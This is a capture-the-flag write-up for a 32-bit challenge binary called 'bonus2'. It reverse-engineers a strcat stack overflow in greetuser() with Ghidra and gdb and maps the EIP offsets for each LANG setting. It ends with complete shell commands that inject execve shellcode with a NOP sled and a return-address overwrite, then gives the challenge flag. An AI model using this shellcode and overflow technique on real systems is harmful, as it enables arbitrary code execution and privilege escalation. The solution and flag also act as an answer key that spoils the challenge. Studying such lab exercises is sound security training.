# bonus 2


## Ghidra Analysis

```
undefined4 main(int param_1,int param_2)
{
  undefined4 uVar1;
  int iVar2;
  char *pcVar3;
  undefined4 *puVar4;
  byte bVar5;
  char local_60 [40];
  char acStack_38 [36];
  char *local_14;
  
  bVar5 = 0;
  if (param_1 == 3) {
    pcVar3 = local_60;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      pcVar3[0] = '\0';
      pcVar3[1] = '\0';
      pcVar3[2] = '\0';
      pcVar3[3] = '\0';
      pcVar3 = pcVar3 + 4;
    }
    strncpy(local_60,*(char **)(param_2 + 4),0x28);
    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
    local_14 = getenv("LANG");
    if (local_14 != (char *)0x0) {
      iVar2 = memcmp(local_14,&DAT_0804873d,2);
      if (iVar2 == 0) {
        language = 1;
      }
      else {
        iVar2 = memcmp(local_14,&DAT_08048740,2);
        if (iVar2 == 0) {
          language = 2;
        }
      }
    }
    pcVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *(undefined4 *)pcVar3;
      pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    uVar1 = greetuser();
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```


1. Stack Duplication & Contiguous Buffers

```
pcVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *(undefined4 *)pcVar3;
      // pointer arithmetic...
    }
```
Because local_60 (40 bytes) and acStack_38 (36 bytes) reside consecutively on the stack, copying 76 bytes (0x13 dwords) bundles both user inputs into a single continuous memory block.

2. Vulnerability
```
strcat(local_4c, &stack0x00000004);
```

Inside greetuser(),strcat() does not check destination buffer capacities. When a large input string is concatenated onto the greeting prefix, it overflows the stack frame, enabling control flow hijack via EIP overwrite.

### The Link Between the Copy in main and strcat

Right before calling greetuser(), the loop we looked at (stack0xffffff50) performs a stack shift / relocation:
It reads those 76 bytes from main's local variables.
It writes them to a new, specific offset on the stack (closer to where the incoming function frame will look).
By shifting these bytes to a predictable stack address, the program effectively hands off your raw input data to the next function without using explicit function parameters. Because greetuser() takes void (no parameters), it doesn't receive your input through a register or an argument variable. Instead, it relies entirely on the stack layout:

&stack0x00000004: This is Ghidra's notation for a memory address located at a fixed positive offset (+4 bytes) from greetuser()'s base frame pointer (EBP).

When greetuser() executes strcat, it looks at that exact stack offset (EBP + 4 or similar). Because main shifted your 76-byte input block right into that memory neighborhood, strcat treats whatever is sitting there as a null-terminated string and blindly appends it to the greeting buffer (local_4c).

====================================================================
  STACK MEMORY LAYOUT (High Address -> Low Address)
====================================================================

  [ HIGHER MEMORY (Top of Stack) ]
  ----------------------------------------------------------------  
   ... (Previous stack frames or environment variables) ...
  ----------------------------------------------------------------
  |  greetuser() FRAME START                                      |
  |  -----------------------------------------------------------  |
  |  EBP_greet (Frame Pointer for greetuser)                    |
  |  -----------------------------------------------------------  |
  |  &stack0x00000004  <--- [ greetuser() reads from here via strcat ]
  |                           (Points right to the shared border) |
  ----------------------------------------------------------------  <-- THE BORDER
  |  MAIN FRAME / STAGING AREA                                    |
  |  -----------------------------------------------------------  |
  |  stack0xffffff50   <--- [ main() copies your 76 bytes here ]  |
  |  (76-byte contiguous block: local_60 + acStack_38 duplicated) |
  |  -----------------------------------------------------------  |
  |  local_60 & acStack_38 (Original input buffers from argv)    |
  |  -----------------------------------------------------------  |
  |  EBP_main (Frame Pointer for main)                          |
  ----------------------------------------------------------------


## 🔍 2. Functionality Analysis & Offsets

Using cyclic test patterns, we mapped the binary's behavior according to the active language:

| Language (`LANG`) | Greeting Message | Exact Offset to Overwrite `EIP` |
| :--- | :--- | :--- |
| **Finnish (`fi`)** | `Hyvää päivää` | **18 bytes** |
| **Dutch (`nl`)** | `Goedemiddag!` | **23 bytes** |

---

We can now construct our payload: since argv[1] provides a larger buffer, we place our shellcode there, preceded by a NOP sled to widen the landing zone and ensure reliable execution when EIP is redirected.

so we can test for nl for example

```
(gdb) x/32wx $esp
0xbffff640:	0x41414141	0x90900041	0x90909090	0x90909090
```
For the target return address, we can point EIP to 0xbffff648, which is represented in little-endian byte order as \x48\xf6\xff\xbf.


## Payload


fi = 
./bonus2	$(python -c 'print "\x90"*17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "C"*18 + "\x54\xf6\xff\xbf"')


nl = 


/home/user/bonus2/bonus2 $(python -c 'print "\x90"*17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "C"*23 + "\x48\xf6\xff\xbf"')

## Flag

71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587